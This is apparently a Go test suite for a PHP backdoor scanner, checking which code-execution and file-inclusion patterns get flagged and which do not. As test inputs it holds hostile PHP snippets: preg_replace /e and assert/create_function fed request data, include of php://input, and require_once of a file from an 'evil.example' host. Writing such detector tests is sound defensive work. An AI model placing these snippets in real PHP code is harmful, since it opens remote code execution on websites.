package checks

import (
	"strings"
	"testing"
)

const (
	indPregReplaceEval = "preg_replace with /e modifier (code execution)"
	indDangerousInc    = "include/require of request input or remote/data wrapper"
	indCodeEvalPrim    = "code-eval primitive (assert/create_function) with request input"
)

// --- preg_replace /e modifier (legacy eval sink, removed in PHP 7) ---
//
// The /e modifier evaluates the replacement as PHP with backreferences
// interpolated from the subject, so the call is an RCE sink only when attacker
// input reaches the replacement or subject. Bare /e with static arguments is
// the legacy WordPress serialize-fix / autolink idiom, not a dropper, so it is
// gated on request-input correlation -- matching the shell, include, and assert
// detectors.

func TestAnalyzePHPContentPregReplaceEvalReplacementRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php preg_replace('/.*/e', $_POST['c'], $subject); ?>")
	if !strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("preg_replace /e with request replacement not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalSubjectRequestFlagged(t *testing.T) {
	// /e evals the replacement with backreferences taken from the subject, so a
	// request-controlled subject is just as exploitable as a request replacement.
	res := analyzePHPString(t, "<?php preg_replace('/.*/e', $repl, $_GET['data']); ?>")
	if !strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("preg_replace /e with request subject not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalAltDelimiterRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php preg_replace('~payload~ie', $_POST['r'], $s); ?>")
	if !strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("preg_replace ~..~ie with request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalPairedDelimitersRequestFlagged(t *testing.T) {
	for _, pattern := range []string{"{payload}e", "(payload)e", "[payload]e", "<payload>e"} {
		res := analyzePHPString(t, "<?php preg_replace('"+pattern+"', 'static', $_GET['s']); ?>")
		if !strings.Contains(res.details, indPregReplaceEval) {
			t.Errorf("preg_replace %q with request input not flagged; details=%q", pattern, res.details)
		}
	}
}

func TestAnalyzePHPContentPregReplaceEvalNoRequestNotFlagged(t *testing.T) {
	// The legacy WordPress serialize-fix and autolink idioms: real /e usage, but
	// the subject and replacement are internal data, not attacker input. These
	// are not droppers and must not flag.
	cases := []string{
		`<?php $r = preg_replace('!s:(\d+):"(.*?)";!e', "'s:'.strlen('$2').':\"$2\";'", $serial); ?>`,
		`<?php $v = preg_replace("#(^|[\n ])([\w]+?://[\w]+[^ \"\n\r\t<]*)#ise", "'\\1<a href=\"\\2\">\\2</a>'", $text); ?>`,
	}
	for _, content := range cases {
		res := analyzePHPString(t, content)
		if strings.Contains(res.details, indPregReplaceEval) {
			t.Errorf("static-argument /e idiom wrongly flagged; content=%q details=%q", content, res.details)
		}
	}
}

func TestAnalyzePHPContentPregReplaceNoEvalNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php preg_replace('/[a-z]+/i', 'x', $s); ?>")
	if strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("plain preg_replace wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceUppercaseEModifierNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php preg_replace('/[a-z]+/E', 'x', $s); ?>")
	if strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("uppercase E modifier wrongly treated as eval; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalInStringNotFlagged(t *testing.T) {
	// A documentation/string example must not trip the scanner.
	res := analyzePHPString(t, "<?php $doc = \"preg_replace('/a/e', ...) is dangerous\"; echo $doc; ?>")
	if strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("preg_replace /e inside a string literal wrongly flagged; details=%q", res.details)
	}
}

// --- include/require of request input or remote/data wrappers (LFI/RFI) ---

func TestAnalyzePHPContentIncludeRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include($_GET['page'].'.php'); ?>")
	if !strings.Contains(res.details, indDangerousInc) {
		t.Errorf("include of request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentIncludeMultilineRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include(\n$_GET['page'].'.php'\n); ?>")
	if !strings.Contains(res.details, indDangerousInc) {
		t.Errorf("multiline include of request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentIncludePHPWrapperFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include 'php://input'; ?>")
	if !strings.Contains(res.details, indDangerousInc) {
		t.Errorf("include of php:// wrapper not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentRequireRemoteFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php require_once('http://evil.example/x.txt'); ?>")
	if !strings.Contains(res.details, indDangerousInc) {
		t.Errorf("require of remote URL not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentStaticIncludeNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php require_once ABSPATH . 'wp-load.php'; include __DIR__.'/config.php'; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("static include wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentStaticIncludeSameLineRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include __DIR__.'/config.php'; $page = $_GET['page']; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("static include with unrelated request read wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentStaticIncludeNextLineRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include __DIR__.'/config.php';\n$page = $_GET['page']; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("static include with next-line request read wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentStaticIncludeSameLineRemoteStringNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include __DIR__.'/config.php'; $url = 'http://example.test/feed'; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("static include with unrelated remote string wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentIncludeVariableNameNotFlagged(t *testing.T) {
	// A variable named $include fed request input is not an include statement.
	res := analyzePHPString(t, "<?php $include = $_GET['x']; echo $include; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("variable named $include wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentIncludeMethodNameNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $loader->include($_GET['x']); ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("method named include wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentIncludeInStringNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $doc = \"include $_GET['page']\"; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("include inside string literal wrongly flagged; details=%q", res.details)
	}
}

// TestAnalyzePHPContentCallUserFuncConcatOnlyNotFlagged guards the
// call_user_func+decoder obfuscation indicator against a concat-only false
// positive: a large minified plugin that uses call_user_func_array, an
// unrelated base64_decode, and heavy string concatenation must not trip it.
// Hex-encoded function-name building (the real obfuscation signal) still does.
func TestAnalyzePHPContentCallUserFuncConcatOnlyNotFlagged(t *testing.T) {
	body := "<?php\n" +
		"call_user_func_array($cb, $args);\n" +
		"$x = base64_decode($data);\n" +
		"$s = \"a\" . \"b\" . \"c\" . \"d\" . \"e\" . \"f\" . \"g\";\n" +
		"?>"
	res := analyzePHPString(t, body)
	if strings.Contains(res.details, "variable function call with decoder and obfuscation") {
		t.Errorf("concat-only call_user_func/decoder wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentCallUserFuncUnrelatedHexNotFlagged(t *testing.T) {
	body := "<?php\n" +
		"call_user_func_array($cb, $args);\n" +
		"$x = base64_decode($data);\n" +
		"$zip = [\"\\x50\", \"\\x4b\", \"\\x03\", \"\\x04\", \"\\x14\", \"\\x00\"];\n" +
		"?>"
	res := analyzePHPString(t, body)
	if strings.Contains(res.details, "variable function call with decoder and obfuscation") {
		t.Errorf("unrelated hex literals wrongly flagged as call_user_func obfuscation; details=%q", res.details)
	}
}

func TestAnalyzePHPContentCallUserFuncReassignedHexNameNotFlagged(t *testing.T) {
	body := "<?php\n" +
		"$name = \"\\x63\" . \"\\x75\" . \"\\x72\";\n" +
		"$name = $cb;\n" +
		"$x = base64_decode($data);\n" +
		"call_user_func($name, $x);\n" +
		"?>"
	res := analyzePHPString(t, body)
	if strings.Contains(res.details, "variable function call with decoder and obfuscation") {
		t.Errorf("reassigned hex-built callback name wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentCallUserFuncCompoundReassignedHexNameNotFlagged(t *testing.T) {
	body := "<?php\n" +
		"$name = \"\\x63\" . \"\\x75\" . \"\\x72\";\n" +
		"$name += 1;\n" +
		"$x = base64_decode($data);\n" +
		"call_user_func($name, $x);\n" +
		"?>"
	res := analyzePHPString(t, body)
	if strings.Contains(res.details, "variable function call with decoder and obfuscation") {
		t.Errorf("compound-reassigned hex-built callback name wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentCallUserFuncAppendHexNameFlagged(t *testing.T) {
	body := "<?php\n" +
		"$name = \"\";\n" +
		"$name .= \"\\x63\";\n" +
		"$name .= \"\\x75\";\n" +
		"$name .= \"\\x72\";\n" +
		"$x = base64_decode($data);\n" +
		"call_user_func($name, $x);\n" +
		"?>"
	res := analyzePHPString(t, body)
	if !strings.Contains(res.details, "variable function call with decoder and obfuscation") {
		t.Errorf("appended hex-built callback name not flagged; details=%q", res.details)
	}
}

// --- assert / create_function code-eval primitives with request input ---

func TestAnalyzePHPContentAssertRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert($_POST['code']); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert with request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertWhitespaceRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert ($_POST['code']); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert with whitespace before paren not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentCreateFunctionRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $f = create_function('$x', $_GET['body']); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("create_function with request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentCreateFunctionWhitespaceRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $f = create_function ('$x', $_GET['body']); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("create_function with whitespace before paren not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertNoRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert(count($items) > 0); ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert without request input wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertSameLineUnrelatedRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert(count($items) > 0); $page = $_GET['page']; ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert with unrelated same-line request read wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertInStringNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $doc = \"assert($_GET['code'])\"; ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert inside string literal wrongly flagged; details=%q", res.details)
	}
}
